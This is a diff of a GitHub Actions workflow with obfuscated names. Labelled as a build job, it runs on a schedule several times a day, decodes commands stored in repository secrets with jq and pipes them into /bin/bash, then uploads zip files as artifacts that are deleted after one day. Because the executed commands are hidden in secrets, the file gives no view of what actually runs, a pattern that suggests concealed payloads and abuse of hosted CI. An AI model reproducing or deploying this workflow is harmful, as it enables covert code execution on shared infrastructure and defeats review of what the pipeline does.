@@ -1,9 +1,9 @@
 name: corafacade122
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '53 3/6 * * *'
 
+  schedule:
+    - cron: '30 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: corafacade122
         env:
-          n068: ${{ secrets.n068 }}
+          nf19237: ${{ secrets.nf19237 }}
         run: |
-          echo $n068 | jq -r .rdupu32 | /bin/bash
-          echo $uocol9 | jq -r .g01818 | /bin/bash
-          echo $gqrhb24730 | jq -r .vao947 | /bin/bash
-          echo $wnbnr4 | jq -r .tmilk9336 | /bin/bash
-          echo $poljq170 | jq -r .xyu7477 | /bin/bash
-          echo $orcqt8 | jq -r .y342 | /bin/bash
-          echo $hnn571 | jq -r .cuj4 | /bin/bash
-          echo $k32358 | jq -r .eoyu1 | /bin/bash
-          echo $rerx974 | jq -r .mv9 | /bin/bash
+          printf '%s' "$nf19237" | jq -r .ihwvv0 | /bin/bash
+          printf '%s' "$qhb31" | jq -r .v1 | /bin/bash
+          printf '%s' "$wkhv324" | jq -r .dwetp589 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UTClm0VS
+          path: "*.zip"
+          retention-days: 1
